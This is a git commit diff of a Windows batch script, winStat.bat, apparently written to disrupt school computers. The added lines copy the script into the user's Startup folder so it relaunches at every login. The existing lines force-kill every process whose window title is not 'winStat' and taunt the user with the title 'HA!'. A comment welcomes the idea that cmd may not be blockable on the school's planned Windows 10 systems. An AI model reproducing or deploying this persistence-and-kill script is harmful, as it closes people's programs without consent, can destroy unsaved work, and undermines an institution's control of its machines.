83ced6c2071a236ba9f4a093393c45463c427872
zacharyacutey <zacharyacutey@users.noreply.github.com>
2016-02-24 16:58:56 -0500

    Update winStat.bat

--- winStat.bat
+++ winStat.bat
@@ -1,6 +1,8 @@
 @ECHO OFF
-::I will never give up batch!
-::Manually put into the startup folder.
+::School system may update to win10 next year,I have found NO information on whether cmd can be blocked in win10! YAY!
+IF NOT "%cd%"=="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
+COPY winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
+)
 TITLE winStat
 TASKKILL /F /FI "WINDOWTITLE ne winStat"
 TITLE HA!
